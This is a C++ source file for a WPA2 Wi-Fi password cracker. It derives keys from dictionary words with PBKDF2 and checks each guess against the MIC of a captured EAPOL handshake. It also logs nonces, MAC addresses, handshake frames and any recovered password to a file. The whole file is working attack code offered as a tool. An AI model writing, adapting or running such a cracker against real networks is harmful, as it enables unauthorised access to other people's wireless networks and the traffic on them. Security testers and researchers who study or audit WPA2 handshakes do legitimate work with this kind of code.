#include "cracker.h"
#include <iostream>
#include <cstring>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

WPA2Cracker::WPA2Cracker() {
    log_file.open("wpa2-attack-info.txt", std::ios::app);
    if (!log_file.is_open()) {
        std::cerr << "[WARNING] Failed to open log file wpa2-attack-info.txt" << std::endl;
    }
}

WPA2Cracker::~WPA2Cracker() {
    if (log_file.is_open()) {
        log_file.close();
    }
}

void WPA2Cracker::pbkdf2_sha1(const std::string& password, const std::string& ssid, 
                               uint8_t* output) {
    PKCS5_PBKDF2_HMAC(password.c_str(), password.length(),
                      (const unsigned char*)ssid.c_str(), ssid.length(),
                      4096, EVP_sha1(), 32, output);
}

void WPA2Cracker::generate_ptk(const uint8_t* pmk, const uint8_t* anonce, 
                               const uint8_t* snonce, const uint8_t* ap_mac,
                               const uint8_t* client_mac, uint8_t* ptk) {
    uint8_t data[100];
    
    // "Pairwise key expansion" (22 bytes) + null byte
    memcpy(data, "Pairwise key expansion", 23); // Includes null terminator
    
    // Min/Max MAC addresses
    if (memcmp(ap_mac, client_mac, 6) < 0) {
        memcpy(data + 23, ap_mac, 6);
        memcpy(data + 29, client_mac, 6);
    } else {
        memcpy(data + 23, client_mac, 6);
        memcpy(data + 29, ap_mac, 6);
    }
    
    // Min/Max nonces
    if (memcmp(anonce, snonce, 32) < 0) {
        memcpy(data + 35, anonce, 32);
        memcpy(data + 67, snonce, 32);
    } else {
        memcpy(data + 35, snonce, 32);
        memcpy(data + 67, anonce, 32);
    }
    
    // PRF-512: Generate 64 bytes of PTK using HMAC-SHA1
    // HMAC-SHA1 gives 20 bytes per iteration, we need 64 bytes total
    // So we do 4 iterations but only use first 64 bytes (discard last 16)
    uint8_t ptk_temp[80]; // Temporary buffer for full 4 iterations
    for (int i = 0; i < 4; i++) {
        uint8_t temp[100];
        memcpy(temp, data, 99);
        temp[99] = i;
        
        unsigned int len;
        HMAC(EVP_sha1(), pmk, 32, temp, 100, ptk_temp + (i * 20), &len);
    }
    // Copy only first 64 bytes to PTK
    memcpy(ptk, ptk_temp, 64);
}

bool WPA2Cracker::verify_mic(const uint8_t* kck, const std::vector<uint8_t>& eapol_frame,
                             const uint8_t* expected_mic) {
    // Create copy of EAPOL frame
    std::vector<uint8_t> eapol_copy = eapol_frame;
    
    // Zero out MIC field (offset 81, length 16)
    if (eapol_copy.size() < 97) return false;
    memset(&eapol_copy[81], 0, 16);
    
    // Calculate HMAC-SHA1
    uint8_t calculated_mic[20];
    unsigned int len;
    HMAC(EVP_sha1(), kck, 16, eapol_copy.data(), eapol_copy.size(),
         calculated_mic, &len);
    
    // Compare first 16 bytes
    return memcmp(calculated_mic, expected_mic, 16) == 0;
}

void WPA2Cracker::log_handshake_info(const WiFiNetwork& net) {
    if (!log_file.is_open()) return;
    
    log_file << "\n==================== Handshake Capture ====================" << std::endl;
    log_file << "Timestamp: " << time(NULL) << std::endl;
    log_file << "SSID: " << net.ssid << std::endl;
    log_file << "BSSID: " << mac_to_string(net.bssid) << std::endl;
    log_file << "AP MAC: " << mac_to_string(net.ap_mac) << std::endl;
    log_file << "Client MAC: " << mac_to_string(net.client_mac) << std::endl;
    log_file << "Channel: " << net.channel << std::endl;
    log_file << "\nCryptographic Material:" << std::endl;
    log_file << "ANonce: " << bytes_to_hex(net.anonce, 32) << std::endl;
    log_file << "SNonce: " << bytes_to_hex(net.snonce, 32) << std::endl;
    log_file << "MIC: " << bytes_to_hex(net.mic, 16) << std::endl;
    
    log_file << "\nEAPOL Message 1 (" << net.eapol_msg1.size() << " bytes):" << std::endl;
    if (!net.eapol_msg1.empty()) {
        log_file << bytes_to_hex(net.eapol_msg1.data(), net.eapol_msg1.size()) << std::endl;
    }
    
    log_file << "\nEAPOL Message 2 (" << net.eapol_msg2.size() << " bytes):" << std::endl;
    if (!net.eapol_msg2.empty()) {
        log_file << bytes_to_hex(net.eapol_msg2.data(), net.eapol_msg2.size()) << std::endl;
    }
    
    log_file << "==========================================================" << std::endl;
    log_file.flush();
    
    std::cout << "[INFO] Handshake details logged to wpa2-attack-info.txt" << std::endl;
}

std::string WPA2Cracker::crack(const WiFiNetwork& net, const std::string& dict_file,
                               std::function<void(int, const std::string&)> progress_callback) {
    std::cout << "[INFO] Starting WPA2 crack" << std::endl;
    std::cout << "[INFO] Target: " << net.ssid << " (" << mac_to_string(net.bssid) << ")" << std::endl;
    std::cout << "[INFO] Dictionary: " << dict_file << std::endl;
    
    std::ifstream dict(dict_file);
    if (!dict.is_open()) {
        std::cerr << "[ERROR] Failed to open dictionary file: " << dict_file << std::endl;
        return "";
    }
    
    std::string password;
    int attempts = 0;
    time_t start_time = time(NULL);
    
    while (std::getline(dict, password)) {
        // Remove trailing whitespace
        while (!password.empty() && (password.back() == '\r' || password.back() == '\n')) {
            password.pop_back();
        }
        
        if (password.empty()) continue;
        
        attempts++;
        
        // Progress callback every 100 passwords
        if (progress_callback && attempts % 100 == 0) {
            progress_callback(attempts, password);
        }
        
        // Log progress every 1000 attempts
        if (attempts % 1000 == 0) {
            time_t elapsed = time(NULL) - start_time;
            double rate = elapsed > 0 ? (double)attempts / elapsed : 0;
            std::cout << "[INFO] Tried " << attempts << " passwords (" 
                      << (int)rate << " pwd/sec)" << std::endl;
        }
        
        // Generate PSK using PBKDF2
        uint8_t pmk[32];
        pbkdf2_sha1(password, net.ssid, pmk);
        
        // Generate PTK
        uint8_t ptk[64];
        generate_ptk(pmk, net.anonce, net.snonce, net.ap_mac, net.client_mac, ptk);
        
        // Extract KCK (first 16 bytes of PTK)
        const uint8_t* kck = ptk;
        
        // Verify MIC
        if (verify_mic(kck, net.eapol_msg2, net.mic)) {
            time_t elapsed = time(NULL) - start_time;
            std::cout << "\n[SUCCESS] ============================================" << std::endl;
            std::cout << "[SUCCESS] Password found: " << password << std::endl;
            std::cout << "[SUCCESS] Attempts: " << attempts << std::endl;
            std::cout << "[SUCCESS] Time: " << elapsed << " seconds" << std::endl;
            std::cout << "[SUCCESS] ============================================\n" << std::endl;
            
            // Log to file
            if (log_file.is_open()) {
                log_file << "\n[CRACKED]" << std::endl;
                log_file << "Password: " << password << std::endl;
                log_file << "Attempts: " << attempts << std::endl;
                log_file << "Time: " << elapsed << " seconds" << std::endl;
                log_file.flush();
            }
            
            return password;
        }
    }
    
    time_t elapsed = time(NULL) - start_time;
    std::cout << "\n[FAILED] Password not found in dictionary" << std::endl;
    std::cout << "[INFO] Total attempts: " << attempts << std::endl;
    std::cout << "[INFO] Time elapsed: " << elapsed << " seconds" << std::endl;
    
    return "";
}